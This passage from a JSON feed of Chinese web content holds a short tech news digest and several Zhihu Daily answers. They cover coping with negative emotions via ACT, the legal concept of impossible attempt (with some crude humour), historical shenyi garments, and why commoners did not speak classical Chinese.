src=\"https://cdn.sspai.com/2021/07/21/article/63cdca635d8dc786fc0b75244520e64f\"></figure><h2>360 安全卫士正式推出「极速版」</h2>\n<p>7 月 20 日，360 安全卫士正式对外发布 360 安全卫士「极速版」，该版本将主打永久免费、无弹窗广告的概念，目前已可以在官网下载。<a href=\"https://www.360.cn/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/article/2ee51216126a5712b306932e0e65adff\"></figure><h2>特斯拉将向其它电动汽车开放超级充电站</h2>\n<p>7 月 21 日，特斯拉 CEO Elon Musk 发布 Twitter 表示，特斯拉计划于今年年内向其他充电汽车开放自己的超级充电站，该项目将在所有国家进行展开。<a href=\"https://twitter.com/elonmusk/status/1417593502351826946?s=20\" target=\"_blank\">来源</a></p>\n<h2>Google 正敦促 Apple 也采用 RCS 消息技术</h2>\n<p>Google 于 7 月 20 日正式宣布和美国运营商 Verizon 达成合作，宣布其信息应用将默认采用 Google 的方案，即 Android 用户使用消息应用聊天时将通过端到端加密的 RCS 进行，但和 iPhone 用户发消息时依旧采用传统的非加密的短信，Google 也因此「敦促」向来重视隐私和信息安全的 Apple 也支持 RCS 技术，即和 iPhone 用户采用 iMessage，而和其他平台用户沟通则采用更安全的 RCS。<a href=\"https://9to5google.com/2021/07/20/google-rcs-apple-iphone-lockheimer/\" target=\"_blank\">来源</a></p>\n<h2>新款 iPad Mini 或将采用 A15 处理器及 USB - C 接口</h2>\n<p>据外媒 9To5Mac 从消息人士处获悉，Apple 将会在今年晚些时候推出一款全新的 iPad Mini，其设计将类似最新的 iPad Air，搭载的 Apple 最新的 A15 处理器，底部将采用 USB-C 接口，并且会配备磁性智能连接器；此外 Apple 还会推出一款入门级的 iPad，内置 A13 处理器，采用类似 2019 年初 iPad Air 3 的设计。<a href=\"https://9to5mac.com/2021/07/20/new-ipad-mini-exclusive-a15-processor-usb-c/\" target=\"_blank\">来源</a></p>\n<h2>三星或于 8 月 11 日发布新的可折叠手机</h2>\n<p>三星发布了下一次 Unpacked 活动的邀请，通过邀请函上「准备打开」（Get ready to unfold）的字样以及类似于 Galaxy Z Fold 和 Flip 外形的矩形图，猜测其在暗示即将发布的折叠新品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/4ec4a4831f2e1f146ce4c533f7593d60.jpeg\"></figure><p>与此同时，三星还开放了「下一代旗舰」的预定，提前预定包括 12 个月的免费三星 Care+ 和 200 美元的额外折扣及其它一些特别优惠。</p>\n<p>发布会将于 8 月 11 日美国东部时间上午十点开始。<a href=\"https://techcrunch.com/2021/07/20/samsung-will-announce-new-foldables-on-august-11/\" target=\"_blank\">来源</a></p>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67778\" target=\"_blank\">在琐碎生活中寻找小小仪式感，我这样记录自己的生活</a></li>\n<li><a href=\"https://sspai.com/post/67790\" target=\"_blank\">一派·Podcast｜2021 年，什么样的数字科技产品更有趣？</a></li>\n<li><a href=\"https://sspai.com/post/67767\" target=\"_blank\">即便快门很快，我也还是想教你如何慢慢冲洗一张照片</a></li>\n<li><a href=\"https://sspai.com/post/67769\" target=\"_blank\">一日一技｜为群晖套件创建桌面独立客户端</a></li>\n</ul>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67825"},{"title":"如何控制负面情绪？","date":"2021-07-20 23:07:40","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-6638fb3f2c669bcdc7356a4a421773d0_l.jpg?source=8673f162\"><span>壹心理，</span><span>专业而有趣的心理服务平台，为大众心理健康提供解决方案。</span>\n<a href=\"https://www.zhihu.com/question/20082759/answer/2007607216\" hidden>阅读原文</a>\n</div>\n<div>\n<p>陷入负面情绪，很像掉入泥沼，难免想控制与挣脱。</p>\n<p>想象一下，负面情绪就像又湿又脏，沾满你的身体，你想不想挣脱？</p>\n<p>是的，你想，你烦死各种负面情绪了。</p>\n<p><strong>可你有没有发现，当你试图控制、对抗各种负面情绪时，就像在泥沼中挣扎一样，你陷得更深了、更痛苦了。</strong></p>\n<p>高考前两个月，我总失眠。</p>\n<p>晚上看到床，上眼皮和下眼皮就不停打架，可手和身体却在抖，心里想着 “绝不能再失眠了，不然明天上课，更听不进去了。”</p>\n<p>关灯后，身体僵直地平躺，手放一会放在肚皮，一会又放到床边，期间脑子安了发电机似的，一直转不个停。</p>\n<p>等头皮发麻时，深深叹一口气，接着坐到床边，用一只手拄着下巴，凝视地上的月光。同时听力变得格外敏感，楼道外的任何声响，都能被轻易捕捉。</p>\n<p>待眼睛自然合上，我才准备躺下。可一挨上枕头，脑子就又变得清醒了，然后攥起拳头轻轻砸墙。</p>\n<p>直到折腾了 5、6 轮，我放弃挣扎，只静静观察呼吸时，不一会儿就睡着了……</p>\n<p>在失眠的这个过程中，我发现自己越试图控制自己不焦虑、要求自己睡觉，结果就更睡不着了，可当我折腾累了，不想着再控制了，焦虑似乎就不可怕了。这是为什么呢？</p>\n<p><strong>控制负面情绪会带来什么？</strong></p>\n<p>“控制情绪”这个词，从本质上就不太可能实现。例如，在高考前两个月，我焦虑是很正常的，基本每个同学都很焦虑。</p>\n<p>控制负面情绪的目的，其实是防止焦虑影响自己的学习与考试。</p>\n<p>而对于当时焦虑我的来说，包括很多试图控制负面情绪的人，其实是在逃避各种负面情绪与感受。</p>\n<p>而逃避痛苦的感受，往往会放大眼前的痛苦，从而陷入越逃避——越痛苦——越逃避——越痛苦的负向循环之中。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-18a864797842fd5890eb12495552a1a3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>因为逃避意味着，我们把痛苦的负面情绪放到了心上，从而使这种感觉更真实、更让人难以摆脱。结果就是，“眼前的痛苦”加剧了。而我们内心苦苦挣扎的同时，生活也就被忽略了，又出现了新的现实问题。结果就是，中间黑点正常的痛苦被放大了。</p>\n<p>高考前，我的一些同学也很焦虑，他们把这种焦虑当成正常的事情，该吃饭睡觉就去做，该学习就去学，焦虑对他们的困扰并不大。</p>\n<p>而我则把焦虑当成了问题，试图控制、逃避这种焦虑，结果焦虑就更严重，我也没办法正常的生活与学习。</p>\n<p>是我把正常的焦虑，放大成了不可控的焦虑。</p>\n<p>与人交往的愤怒也一样。当你生别人的气时，用无伤大雅的话戏谑表达小小的不满，也就没什么事情啦。而很多人不愿承认与表达自己生气了，一直憋着憋着，等憋不住了就爆发，爆发后又自我指责。</p>\n<p>事实上，情绪只要你承认接纳，而非逃避和控制，它并不能怎样。</p>\n<p><strong>为什么很多人总想控制负面情绪呢？</strong></p>\n<p><strong>1.其它行为（情绪、身体）以外，控制这种行为非常好用，你认为这种控制也能运用到思维和感受上。</strong></p>\n<p>例如，在现实里讨厌某个人，我们可以远离这个人。而负面情绪不一样，你越想远离，它就越强大。</p>\n<p><strong>2.你总是被教导，要控制自己的想法和情感。</strong></p>\n<p>例如，当你还是个孩子时，就有人告诉你：“不要哭了，再哭我就狠狠地教训你。”</p>\n<p><strong>3.当你很小时，你身边的 “成年人”好像都能控制自己的行为和情感。</strong></p>\n<p>例如，你可能会感到害怕，而爸爸却从不害怕；你经常大哭，而周围成年人却从不哭。</p>\n<p>事实上他们不是控制了情绪，而只是没有让自己的情绪表现出来，影响身边人而已。想想现在你身边的闺蜜、兄弟，哪个不会被情绪困扰呢？</p>\n<p><strong>4.在你成长过程中，一直被教导幸福就是没有痛苦的体验。</strong></p>\n<p>很多商业广告，例如香烟、汽车都传递了这么一个信息：“幸福都等同于没有痛苦的想法和感觉——如果你购买了一个产品，你就会更棒，感觉更幸福。”</p>\n<p>这些广告强化了幸福的正向愉悦，而忽略了对负面情绪和痛苦的接纳。</p>\n<p>可事实上，哪个人的生活没有痛苦呢，但这也可以很幸福。</p>\n<p><strong>5.控制痛苦的想法和感受，在短时间内好像真的有用。</strong></p>\n<p>我有个朋友，内心觉得自己没用（低价值感），然后就疯狂工作，让自己变成一个工作狂。在短期内，她的低价值感确实减弱了。</p>\n<p>可她的内心总觉得隐隐有些不对，即使取得了成就，也觉得自己不够好。</p>\n<p><strong>别控制，而是接纳负面情绪</strong></p>\n<p>看完上面的回答，我们理解了不能控制负面情绪，那应该怎么做呢？有没有具体的方法呢？</p>\n<p>当然有。ACT 疗法提出两个方法，与情绪和思维保持距离。</p>\n<p><strong>和情绪保持距离</strong></p>\n<p>很多时候我们讨厌排斥负面情绪，是因为它离我们太近了，甚至它会呈现在我们的身体感受中，让我们很不舒服，所以我们想赶走它。</p>\n<p>我们可以通过把情绪感受，通过画画的形式，形象化呈现在一张纸上，从而保持距离。</p>\n<p>在一个个案模拟中，咨询师让来访者把焦虑画在一张纸上，来访者画了一个大耳朵图图，只是嘴巴是撅着的。</p>\n<p>然后咨询师，问这个来访者：“当你看着纸上代表焦虑的大耳朵图图时，你有什么感觉？”</p>\n<p>来访者说：“它好像没那么讨厌了，我觉得自己可以接受它了，它好像就是一种感受而已。”</p>\n<p>当我们意识到情绪只是一种感受时，我们就能接受这种负面情绪，进而充分感受和体会这种情绪，就不会出现上面所说的，把 “正常的痛苦”放大，进而过度的影响正常的生活。</p>\n<p>咨询师接着让来访者，将这幅画放到钱包里，带着它生活。</p>\n<p>我们其实也可以，带着一些负面情绪生活，依旧可以幸福快乐的生活。</p>\n<p>所以等下一次，如果产生了例如愤怒的负面情绪时，你就可以用手机或纸把愤怒画下来，然后体会这种愤怒，接着带着这种淡淡的愤怒正常的生活。</p>\n<p>当然也可以不画画（如果没条件的话），而是保持着负面情绪只是一种情绪而已，我可以接受它、感受它、带着它生活的态度，负面情绪就不会带来什么影响。</p>\n<p><strong>和思维（念头）保持距离</strong></p>\n<p>熟悉情绪 ABC 理论的朋友都知道，当发生事件 A 时，我们的头脑会对这件事产生 B 的解释，从而产生 C 的情绪。</p>\n<p>此时，我们只需要调整 B，就能改变 C 的情绪。</p>\n<p>例如，当工作没做好被领导批评时（A），可能会产生自己无能、失败的想法（B），从而产生沮丧失落的情绪。(C)</p>\n<p>我们可以将 B 调整为 “任何人都会犯错，这不意味着我不好”，从而改变 C。</p>\n<p>而 ACT 疗法与其不同，它不是去调整 B，而是让自己观察想法 B、与其保持距离，从而不认同 B 的想法。</p>\n<p>具体有以下方法：</p>\n<p><strong>1.大声快速重复头脑里的想法：我很无能很失败。（尽可能大声与快速）</strong></p>\n<p>当重复 10-20 遍的时候，你会发现，这其实只是一种想法而已。</p>\n<p><strong>2.用不同的滑稽的声音重复想法</strong></p>\n<p>你可以用唱歌、唐老鸭、熊二的声音重复 “我无能，我很失败”的想法。</p>\n<p>用滑稽的声音去提醒自己，它只是一个念头和想法而已。</p>\n<p><strong>3.利用正念去观察头脑里的想法</strong></p>\n<p>你可以想象头脑里的想法，就像河流上的一片树叶一样。当你被领导批评时，头脑会涌现很多念头（树叶），你就看着这些念头涌入你的大脑，再令其自然的流过即可。</p>\n<p>你不当真，仅仅是观察这些想法，它们一会也就变得安静了。</p>\n<p>我喜欢将 ACT 疗法，称为 “躺平疗法”，当负面情绪和想法来袭时躺下，让它们自由的经过你的身体和头脑，它们也就过去了。</p>\n<p>躺的越平，负面情绪的影响就越小，我们就能拥有更多的时间和精力去做真正重要的事情。</p>\n<p>所以，别控制负面情绪，躺下！</p>\n<p> </p>\n<blockquote>参考文献：《学会接受你自己：全新的接受与实现疗法》</blockquote>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20082759\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738314"},{"title":"刑法中的“不能犯”是什么意思？","date":"2021-07-20 23:07:30","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/e747f3a9ac831afcf4154c790945f13a_l.jpg?source=8673f162\"><span>从八品盛京游牧副尉，</span><span>略懂法术</span>\n<a href=\"https://www.zhihu.com/question/321527669/answer/696677569\" hidden>阅读原文</a>\n</div>\n<div>\n<p>学习过刑法的老铁都知道，一旦着手开始实行犯罪行为，后续可能的犯罪形态就是，中止、既遂和未遂。其实还有一种发展方向，就是不能犯。</p>\n<p>不能犯是指：以行为当时存在的客观事实作为判断依据，从具有科学常识的一般人的立场进行判断，没有发生结果的现实可能性。</p>\n<p>简要来说就是：<strong>正常来讲，干的这事没有危险。</strong>或者说，不具备驾驭这次犯罪的条件。</p>\n<p>根据定义，我们把不能犯所需要的考虑条件提炼出来，逐条阐述一下：</p>\n<p><strong>第一，判断素材：行为时存在的客观事实。</strong>这个客观事实根据我国司法实践，采用的观点是“具体危险说”，就是以行为当时一般人能够认识到的事实为基础（站在行为当时预测该行为事后发生结果的可能性），如果没有发生结果的可能性，就是不能犯。来一个直观点的例子，《我开始摇滚了》里面有句歌词，非常好的描述了什么叫<strong>行为时存在的客观事实，</strong>如果歌词里的这位爸爸，误以为自己是国家工作人员而收受了他人财务，就是受贿罪的不能犯。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-65262775cff97041a8f7ff35b509e380_720w.jpg?source=8673f162\" alt=\"\"><figcaption>客观事实：没职位，无犯罪</figcaption></figure><p>再比如说，《功夫》里面周星驰假扮黑社会，他以为自己是黑社会，认为理应得到的罪名是成立组织领导黑社会罪，但事实上高估了自己的黑社会属性，顶多构成诈骗罪。从后续效果来看，还是诈骗罪未遂。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ca71b5d08a72f44cd6b72228d36eb09b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>第二，判断立场：具有科学常识的一般公众。</strong>一个很好的例子来自于电影<strong>《</strong>背靠背脸对脸<strong>》</strong>，里面爷爷为了让自己孙女变哑巴，给孙女喝烟油水，即使大部分观众认为这种行为具有危险性，但是由于投入的量少，从科学常识的一般公众来看，并没有变哑巴或者发生其他伤害的可能性，成立不能犯。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c660f16568283386442b318827af020c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>第三，危险性：行为当时具有发生结果的可能性。</strong>举个美队的例子吧：九头蛇想要弄美队，挺会挑地方，一个电梯间满满登登站了一堆杀手。以为这下稳了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e00f517d72cf50c4f546ba99f068d06a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>没想到对于美队来说，人还是不够多。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-bc2080f004715df175cb5ce2397a17f4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然美队有特殊体质不死光环，但从一般公众的角度认为，这满满一电梯人仍然具有杀伤美队的可能性。所以不成立不能犯，成立未遂。</p>\n<p><strong>第四，危险性的判断，既要看具体对象，也要看周遭的环境。</strong>引用一个楼主老铁 <a href=\"http://www.zhihu.com/people/986c60bb14a4bd895e80344b8315c559\">@奇昊楷</a> 的例子，在一个月黑风高夜，抱住一个身影就是一顿艹，最后发现是哈士奇，成立强奸罪不能犯。但如果加入了环境因素，比如月黑风高夜，在一个经常有人走夜路的巷子里，或者是站街女聚集地，抱住一个身影一顿艹，即便是哈士奇，但从周围环境来看，仍有强奸到他人的危险性，如果他想强奸的是女的，构成强奸罪未遂，如果想强奸男的，构成强制猥亵罪未遂。</p>\n<p>最后，举一个不能犯的例子：</p>\n<p>隔壁有个 80 多岁的大爷在小区树下发现了一条黑色的蛇，纹理来看属于国家二级保护动物，都冻僵了，大爷就把他揣在怀里，想温暖过来当宠物。该行为已经涉嫌非法猎捕野生动物罪。但是经过公安机关侦查发现，大爷属于不能犯，当场释放。</p>\n<p>回到家后，大爷就在小区树下挂了一块牌子：禁止随地大小便。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-9707685cbaefd8cc0cce0b968bbe0715_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/321527669\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738286"},{"title":"古代人会穿更古代的衣服吗?","date":"2021-07-20 23:07:20","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8abdd08240bd28e7d9d6dbf7820e846c_l.jpg?source=8673f162\"><span>綾音Ayane，</span><span>三坑少女/妆娘/中国古代史/汉语言文学/女性向消费数码</span>\n<a href=\"https://www.zhihu.com/question/472327155/answer/2002989881\" hidden>阅读原文</a>\n</div>\n<div>\n<p>岂止是会，有些古代人简直会把穿更古代的衣服当做一种值得炫耀的事情，如果他们生活在现代，一定会被某些人批判为“莫名其妙的优越感”</p>\n<p>不管是古画里面常见的穿着各种古代衣服的路人，还是宫廷里不知道什么时候刮起来的复古风——其实古代女性除了礼服之外并没有固定的什么朝代穿什么衣服，除了清朝的“剃发易服”，古时候很少有规定百姓日常穿什么衣服，每次改动的礼制也仅仅是“礼制”而已。</p>\n<p><strong>古代人会不会考据更古代的衣服呢</strong></p>\n<p>关于这个问题，我们就拿著名的深衣举例子吧。</p>\n<p>深衣这种东西，《礼记》的记载是起源于有虞氏。</p>\n<blockquote>“有虞氏皇而祭．深衣而养老。”——《礼记·王制》</blockquote>\n<p>有虞氏，也就是虞舜的氏族，看这个名字就知道了，比《礼记》写成的时间早得多。</p>\n<p>也许深衣就是周朝人崇尚三皇五帝时期才这么穿也说不准呢（x）</p>\n<p>当然，深衣这种形制简直贯穿了中国上下五千年。现在的汉服也会大体分为通裁制和深衣制。</p>\n<p>简单说深衣的形制就是衣裳连在一起，分开剪裁但是缝在一起的袍服。</p>\n<p>在这个回答里，我们着重来说<strong>直裾深衣</strong>，毕竟后世复原的深衣也以直裾为主。</p>\n<p>《礼记》是这样记载的</p>\n<blockquote>古者深衣盖有制度，以应规、矩、绳、权、衡。短毋见肤， 长毋被土。续衽钩边．要缝半下．袼之高下．可以运肘．袂之长短．反诎之及肘．带．下毋厌髀．上毋厌胁．当无骨者．<br>制十有二幅．以应十有二月．袂圜以应规．曲袷如矩以应方．负绳及踝以应直．下齐如权衡以应平．故规者．行举手以为容．负绳抱方者．以直其政．方其义也．故易曰．坤六二之动．直以方也．下齐如权衡者．以安志而平心也．五法已施．故圣人服之．故规矩取其无私．绳取其直．权衡取其平．故先王贵之．故可以为文．可以为武．可以摈相．可以治军旅．完且弗费．善衣之次也．<br>具父母．大父母．衣纯以缋．具父母．衣纯以青．如孤子．衣纯以素．纯袂．缘．纯边．广各寸半。</blockquote>\n<p>当然，由于《礼记》是西汉人写先秦礼制，我个人认为，看礼记不如看文物。</p>\n<p>这一点现代的汉服爱好者可比古代的汉服爱好者幸福多了，我们有文物复原可以穿啊。</p>\n<p>战国时期的深衣，是有正经的出土文物的。</p>\n<p>下面这两件都是马山楚墓出土的战国直裾深衣。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-525d5bfed2da77bfc6593f8d2859c4a0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-30459aaaddd725a7954b68c970c8ffd6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我们看史书的时候，觉得几百年一瞬间就过去了。</p>\n<p>可是，真的到了当时的人身上就不是这么回事儿了，就像是现在想找个做旗袍做得好的老师傅都要费很大力气一样，而旗袍这种东西，一百年前正是非常流行的东西呢。</p>\n<p>东汉的经学大师郑玄，对深衣进行了注释。他对于续祍勾边发表了自己的见解。</p>\n<blockquote>续，犹属也。衽，在裳旁者也。属，连之，不殊裳前后也。钩，读如“鸟喙必钩”之“钩”。钩边，若今曲裾也。续，或为“裕”</blockquote>\n<p>这里面要提一句曲裾了，都是深衣，咱们不能总提直裾深衣嘛。</p>\n<p>曲裾这个词最早出现于《汉书》，和交输经常一起出现，意义并不十分明确，而后世的书籍里面也经常出现，当代文物学家孙机认为：</p>\n<blockquote>按照《礼记》记载，深衣一大特点是“续衽钩边”，也就是说“这种服式的共同特点是都有一幅向后交掩的曲裾。”</blockquote>\n<p>总之这个“续祍勾边”，到了东汉就如同悬案一样，后世基本上参考的都是郑玄注。</p>\n<p>唐代的孔颖达也对深衣做了更多的注解。</p>\n<p>在这历史的长河里，可以说各种大儒都在努力的考据深衣是个什么样式，都在考据先贤到底穿的是什么样的衣服。不得不说，古代的“考据党”真的很多。</p>\n<hr>\n<p><strong>古代人会不会穿更古代的衣服呢</strong></p>\n<p>当然，咱们说的是古代人会不会穿更古代的服饰。前面提到的更多是古代人会不会考据更古代的服饰。</p>\n<p>会不会穿，当然是会的。</p>\n<p>毕竟后世推崇儒家，对于《礼记》里面记载的深衣，当然是心生向往。</p>\n<p>其中最著名的就是朱子深衣和明制深衣了。</p>\n<p><strong>司马温公深衣</strong></p>\n<p>司马温公，就是我们熟悉的砸光的司马缸（x）</p>\n<p>其实，司马光也是会在家穿深衣的。</p>\n<p>在邵伯温所著《邵氏闻见录》中，就有司马光穿着深衣，然后被他父亲指责的故事。</p>\n<blockquote>司马温公依《礼记》作深衣、冠簪、幅巾、缙带。每出，朝服乘马，用皮匣贮深衣随其后，入独乐园则衣之。常谓康节（邵雍）曰：“先生可衣此乎？”康节曰：“某为今人，当服今时之衣。”</blockquote>\n<p>不知道为什么，写到这我突然觉得很有意思，如同司马光这样的古人，也会因为穿深衣而被人吐槽“现代人就该穿现代的衣服。”</p>\n<p>简直是我等汉服爱好者的日常了有木有。</p>\n<p>司马光提出，深衣应该是白色黑边儿的，于是，从他之后，人们复原的深衣都是白色黑边。</p>\n<p><strong>朱子深衣</strong></p>\n<p>我们再来说<strong>朱子深衣</strong>。</p>\n<p>著名的朱子深衣，就是朱熹根据《礼记》记载的深衣自己研究出来的。</p>\n<p>当然事实证明他研究的并不对，朱子深衣的形制是直领对襟，穿的时候穿成交领。就像是我们穿浴袍一样。</p>\n<p>而正经的深衣本身就是交领剪裁。</p>\n<p>不知道如果朱熹能穿越到现在，看见马山楚墓的出土文物，会是一种什么样的心情。</p>\n<p>真实“时代的眼泪”（x）</p>\n<p>（“时代的眼泪”是汉服圈的一个梗，最著名的就是裥裙，从前汉服爱好者穿的裥裙都是梯形布打褶，直到周氏墓的四破三裥裙文物出土复原，原来裥裙是方形布打褶。）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-df3a874271fc1d6ef7c0cf3f8c3c37e9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>四库全书 朱子深衣</figcaption></figure><p>虽然朱子深衣和战国深衣区别大到我等外行一眼都能瞅出来区别，但是当时朱熹是真的下了一番功夫的。他考据了各种儒家经典，才复原出这样的朱子深衣。并且一不小心，朱子深衣这个形制他就火了起来，甚至影响了整个东亚文化圈。</p>\n<p>就，看韩剧的时候，大家有没有觉得，男性的韩服这么眼熟呢……</p>\n<p>与此同时，从朱子深衣开始，幅巾和深衣便牢牢的联系到了一起，称为深衣礼服的首服。</p>\n<p>此后的明代文物和容像都说明在深衣结构款式改变的情况下，幅巾的功用并未改变。</p>\n<p><strong>明制深衣</strong></p>\n<p>然后我们再来说说<strong>明制深衣</strong></p>\n<p>明代推崇古礼，朱元璋在建立明朝以后，非常重视恢复礼制，所以明代的礼制是上取周汉，下取唐宋。</p>\n<p>礼制嘛，当然包括服装，所以明明朝的时候，深衣是作为一种礼服出现的，常用于冠礼，祭祀等等场合。</p>\n<p>与此同时。明代的文人都非常喜欢推崇古礼，不同俗流，所以很多人在家也会穿类似深衣的形制。</p>\n<p>而明制深衣，最具有参考性的就是张懋夫妇墓出土的全套深衣了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ca6fc2b7f2d744c0d965dd224d43d292_720w.jpg?source=8673f162\" alt=\"\"><figcaption>张懋墓深衣</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-2c9f457e46e3993d72216e6fc01cb281_720w.jpg?source=8673f162\" alt=\"\"></figure><p>感谢评论区提醒，配图换为张懋墓的大带</p>\n<p>从这张图可以看到，明制深衣都是有一个如同蝴蝶结的大带的。非常有意思。</p>\n<p><strong>其他深衣</strong></p>\n<p>当然，除此之外，还有元代的<strong>吴澄深衣</strong></p>\n<p>他根据“六二之动”提出了“衣六幅裳六幅”之说。</p>\n<p>而朝鲜大儒<strong>郑逑</strong>则认为，“制十有二幅“指的是衣裳布幅总数。</p>\n<p>还有<strong>黄梨洲深衣</strong>，明代学者黄宗羲著有《深衣考》</p>\n<p>而他复原出来的深衣以续衽收袷为特色。</p>\n<p>（小声说：其实我觉得黄梨洲深衣特别特别帅）</p>\n<p>以及还有清代的<strong>江永深衣</strong></p>\n<p>他理解的深衣是</p>\n<blockquote>上衣用布二幅，共二尺二寸；两袖（即袂）各用布二幅，共用布四幅。袖口（即袪）一尺二寸，袖肩用布二尺二寸。因此两袖的前端下面，因斜裁的关系而成为半圆形。襟分内部和外部，两襟相交，便成方领。</blockquote>\n<hr>\n<p>所以，其实古代人也对更古代的衣服有向往和追求，会想要努力复原从前的衣服，也会“臆造”许多不同的形制出来。这些方面，他们和我们现代的汉服爱好者并没什么区别。</p>\n<p>只不过，现代的汉服爱好者要更幸福一些，因为，我们有出土文物复原啊</p>\n<p>起码就不会因为战国深衣到底长啥样而吵架了。</p>\n<p>就算是吵某个形制具体应该如何，最后吵不出结果也会撂下一句“等文物出土 / 复原的”。</p>\n<p>想想就太幸福了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/472327155\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738295"},{"title":"古代平民说话也用文言文吗？","date":"2021-07-20 23:07:11","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-f04d65ed0008119f42f578e3957a23a2_l.jpg?source=8673f162\"><span>墨子连山，</span><span>干货在这不受待见，我把他们放在“同名公众号”了……</span>\n<a href=\"https://www.zhihu.com/question/52182096/answer/2001902795\" hidden>阅读原文</a>\n</div>\n<div>\n<p>先别说古代平民说话用不用文言文，就说现在的高级知识分子，教授、院士们讲课或者公开演讲有没有用书面语的？</p>\n<p>没有吧？因为根本没法用，如果一位教授开口就是，“今日，我将与诸位同学一道，共同对《组合数学》进行初步的研究与探讨，以期达到运用自如之效果……”，咱们会不会觉得他是精神病？</p>\n<p>放到古代，假如老子给关令尹喜讲道，张口就是“道可道，非常道，名可名，非常名……”，你觉得关令尹喜同志能听得明白？</p>\n<p>大宗师都没法用书面语说话，平民有几个认识字的？还用文言文说话？</p>\n<p>古代文字最早刻在甲骨上，就是甲骨文，后来刻在青铜器上，叫金文，再后来写在竹简上，那之后文字和书籍才能开始流传，否则只能在贵族圈子里面小范围使用。为什么呢？因为文字不论刻在哪里，其雕刻成本是极高的，所以古人用文言文，现实原因就是为了降低刻字成本，否则像我现在这样啰里八嗦、不加节制地说起来没完，一本书刻出来估计要等个十年八年，成本嘛，可真的要一字千金了。</p>\n<p>既要节约成本，又要把话说明白，怎么办？古人有办法，他们从用字上面下功夫。</p>\n<p>首先尽量不要出现废字，这就跟当年拍电报是一个意思，按字收费，所以大家都斟酌再三，力求用最简单的几个字把事情说清楚，例如：父亲生病快不行了，你快点回来。转化成电报就是：父危速回。</p>\n<p>其次是要把每一个字用精，最大程度地挖掘单个汉字的潜能，那时候才真的是咬文嚼字。所以，文言文里面的任何一个字都不是随便用的，用口语解释恐怕有的字能写一句话，有的字可以写篇文章，甚至有的字都够写一部书了，例如这个“道”字，已经不止写了一部书，古往今来注疏无数，可现在看来还是没写清楚。</p>\n<p>最后，古人发现篇幅资源实在太受局限，就算把单个字的潜力发挥到极致也还是写不清楚，那怎么办？于是，他们创造出了一种叫“意境”的东西，就是通过文字给我们以想象空间，方法可以是比喻，可以是寓言，总之虽然说得没那么严谨，甚至也不那么清楚，但是我可以给你指个方向，你自己往那个方向走，边走边看，走得远了看得多了，自己就明白了。明白之后，这些文字也就不再重要，这叫“得意忘言”。</p>\n<p>这是中国人极高明的地方，通过“意境”试图把自然语言的能力压榨干净，以至于中国的文学、历史、哲学、艺术自古就分不了家，诗词歌赋、议论文章，他们就是哲学的载体，同时又是文学艺术，其本身就是对美的追求。</p>\n<p>当然，有优势就必然有劣势。</p>\n<p>优势是有深度，甚至使人常读常新，也可以让人遐想连篇，随着阅历的增加，领悟也就增加了。所以，理解《道德经》主要靠的不是“学”，而是“习”，也就是实践。好比咱们《篮球理论》看得再多，也学不会打球，对不对？怎么才能学会呢？要去球场打才行。打一场再去对照理论复盘，看看问题在哪，带着答案回去打，把毛病改掉，如此往复，就可以成为高手。也正是因为这个特点，理论上面的一些文字、语句有些出入就没必要吹毛求疵了，这些偏差在实践之后都会自然而然地被校正过来。管他写的是分解训练、还是协调发力呢？总之我们最后把标准动作做熟练、变成了肌肉记忆，自然就成了高手，谁在场上打球还会想着“哎哟，我这个动作不标准吧”？</p>\n<p>劣势也同样明显，就是牺牲了精度。西方以他们的语言为原型，提取出了形式逻辑，进而有了数学语言，这就是语言应用的另一个极端，追求精确。数学对模糊是零容忍的，必须清晰地定义每一个概念，每一个数字和符号的定义都不能变，变了就是错误。而数学之美也正在于此，基于几个直观的公理就可以建构出一栋摩天大楼，而且整个系统之精密与优雅，足矣让人产生美的享受。只不过，这种精密必然地牺牲了深度，他将客观世界做了高度抽象，高度之高以至于当我们把他还原到客观世界时已经找不到完美的对应物，例如最简单的射线在客观世界中就找不到，连光线都是弯曲的，还有什么事物可以是平直的呢？这种高度抽象使得数学在描述复杂系统时捉襟见肘，例如我们甚至没办法预测任何一个人的行为，哪怕自己的都不行，因为那背后是一个混沌系统。</p>\n<p>所以，人类在未来很长一段时间的探索中，自然语言与数学语言必然缺一不可。而汉语系统在目前看来，是最完善的自然语言系统，因为每一个文字都可以追溯到甲骨文，再到金文、小篆、隶属、楷书、简体字，这就把每一个文字变成了一部电影，其信息量远超字母语言，甚至在维度上都是